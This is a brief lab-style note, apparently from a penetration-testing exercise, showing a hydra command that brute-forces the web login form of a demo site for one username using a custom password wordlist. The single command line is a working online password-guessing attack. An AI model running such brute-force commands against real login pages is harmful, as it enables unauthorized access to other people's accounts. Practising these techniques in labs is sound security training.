With this command we can run the list passwords from list and check the correct password out of it.
hydra -l wscarlett -P /usr/share/wordlists/custom/passwd-wordlist.txt test-site.demo http-form-post "/[LOGINPAGE]:username=^USER^&password=^PASS^&Login=Login:Invalid Password" 
